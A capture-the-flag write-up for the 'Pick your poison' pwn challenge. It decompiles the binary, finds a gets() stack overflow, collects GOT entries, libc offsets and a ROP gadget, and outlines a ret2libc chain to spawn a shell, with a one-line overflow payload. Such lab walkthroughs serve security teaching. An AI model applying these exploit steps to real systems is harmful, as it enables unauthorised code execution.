# Pick your poison
Pwn

## Challenge 

    Please enter a name: _ _ _ _ _

    nc challs.hats.sg 1306

    Recommended Reading:

    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/
    https://www.youtube.com/watch?v=8QzOC8HfOqU
    Author: Lord_Idiot

## Hint

## Solution

#### Decompile

Decompile main()

    int main() {
        rax = 0x0;
        rax = banner();
        rax = 0x0;
        *(int32_t *)choice = menu();
        if (*(int32_t *)choice == 0x1) goto loc_401d68;

    loc_401d53:
        if (*(int32_t *)choice == 0x2) goto loc_401d74;

    loc_401d58:
        if (*(int32_t *)choice == 0x0) {
                rax = 0x0;
                rax = choice_0();
        }
        else {
                rax = puts("Invalid poison!");
        }
        goto loc_401d8a;

    loc_401d8a:
        rax = puts("+------------+---------------------+\n|   Poison   |   0. Old Man Gets   |\n| > Exit     |   1. Sir Ken F      |\n|            |   2. St. R. Copy    |\n+------------+---------------------+");
        rax = puts("Exiting ...");
        rax = exit(0x0);
        return rax;

    loc_401d74:
        rax = 0x0;
        rax = choice_2();
        rax = 0x0;
        rsp = rsp + 0x8;
        rbp = stack[2047];
        return rax;

    loc_401d68:
        rax = 0x0;
        rax = choice_1();
        goto loc_401d8a;
    }


    int choice_0() {
        rax = puts(0x402230);
        rax = 0x0;
        rax = printf("Say> \"");
        rax = 0x0;
        rax = gets(&var_70);
        rsi = strlen(&var_70) + 0x6;
        rax = 0x0;
        rax = printf(0x40231f);
        return rax;
    }

Decompile win()

    int win() {
        memset(&var_10, 0x0, 0xb);
        var_4 = open("./flag", 0x0);
        if ((*(int32_t *)choice >= 0x0) && (*(int32_t *)choice <= 0x2)) {
                rdx = *(int32_t *)choice;
                lseek(var_4, sign_extend_64((rdx << 0x2) + rdx + (rdx << 0x2) + rdx), 0x0);
                read(var_4, &var_10, 0xa);
                printf("Here you go! %s", &var_10);
                rax = close(var_4);
        }
        else {
                rax = puts("How did you even get here?");
        }
        return rax;
    }

In each choice, there are inputs

- choice_0 = gets()
- choice_1 = scanf("%s")
- choice_2 = read(x, x, 0x20);

choice_0 seems like an easy choice.


#### Fuzz offset

Found offset = 120

    # (echo '0'; python -c "from pwn import *; print 'A'*120 + p64(0xffffeeeeccccbbbb)") | strace ./poison 

    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffeeeeccccbbbb} ---
    +++ killed by SIGSEGV +++
    Segmentation fault

#### Get addresses of functions

Address of win()

    (gdb) info add win 
    Symbol "win" is at 0x401daf in a file compiled without debugging.

Address of main()

    (gdb) info add main 
    Symbol "main" is at 0x401d2a in a file compiled without debugging.

At first, I thought that we can simply call the win() method. But apparently, win() only prints out the first 10 chars of the flag. We have to use libc rop to call system() and solve this challenge.

#### Leak LIBC

In order to leak libc, we need to do the following in ROP form.

    printf@plt(*printf@got)

This will give us the address of printf in libc.

Decompile in hopper. Find PLT and GOT of printf

    j_printf:        // printf
    0000000000401050         jmp        qword [printf@GOT]     

    printf@GOT:        // printf
    0000000000603038         dq         0x0000000000604020 

Use objdump, we can find GOT also

    # objdump -R poison | grep printf
    0000000000404028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5

#### Offsets to system (Locally)

Do locally check using LDD

    # ldd -r -v poison     
        linux-vdso.so.1 (0x00007fffdc78f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6b21720000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6b218e6000)

        Version information:
        ./poison:
            libc.so.6 (GLIBC_2.7) => /lib/x86_64-linux-gnu/libc.so.6
            libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
        /lib/x86_64-linux-gnu/libc.so.6:
            ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2
            ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
      2203: 0000000000022a30   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " gets"
    89: 000000000006fce0   432 FUNC    WEAK   DEFAULT   13 gets@@GLIBC_2.2.5

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
      1403: 00000000000435d0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " printf"
       627: 0000000000056ed0   195 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5

    # strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
      17f573 /bin/sh

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " read@"
    924: 00000000000e91c0   153 FUNC    GLOBAL DEFAULT   13 read@@GLIBC_2.2.5

#### Offsets to system (Server)

From HeapSchool, we know the server uses (Ubuntu GLIBC 2.23-0ubuntu11).

***One way***: Lookup table on https://libc.blukat.me/

https://libc.blukat.me/d/libc6_2.23-0ubuntu11_amd64.symbols 

    printf 0000000000055800
    gets 000000000006ed80
    system 0000000000045390
    str_bin_sh 18cd57

***Second way***: We can download libc for ubuntu here: 

- [libc6_2.23-0ubuntu11_amd64.deb](https://ubuntu.pkgs.org/16.04/ubuntu-updates-main-amd64/libc6_2.23-0ubuntu11_amd64.deb.html)

Then [extract it](https://www.cyberciti.biz/faq/how-to-extract-a-deb-file-without-opening-it-on-debian-or-ubuntu-linux/)

    # ar vx libc6_2.23-0ubuntu11_amd64.deb
    
    # dtrx data.tar.xz

After that, we can get the addresses

    # readelf -s xtract/data/lib/x86_64-linux-gnu/libc.so.6 | grep " read"
    891: 00000000000f7250    90 FUNC    WEAK   DEFAULT   13 read@@GLIBC_2.2.5

    # readelf -s xtract/data/lib/x86_64-linux-gnu/libc.so.6 | grep " printf"
    603: 0000000000055800   161 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5

    # readelf -s xtract/data/lib/x86_64-linux-gnu/libc.so.6 | grep system
    1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

    # strings -tx xtract/data/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
    18cd57 /bin/sh


#### ROP gadgets

This is a 64-bit system, so the parameters need to be pop-ed onto RDI

    # ROPgadget --binary ./poison | grep 'pop rdi'
    0x0000000000401ed3 : pop rdi ; ret

#### Solved for flag

Now we have all the info we need, I tried it locally and it was a success.

However, when doing on the server, it did not work. I changed the leaking of printf@got to gets@got and it still does not work. When I changed to read@got, it works.

Hence, I did the following in ROP form.

    printf@plt(*printf@got)

Cat flag

    # python3 solve_rop.py 

## Flag

    HATS{Making_flags_is_hard}
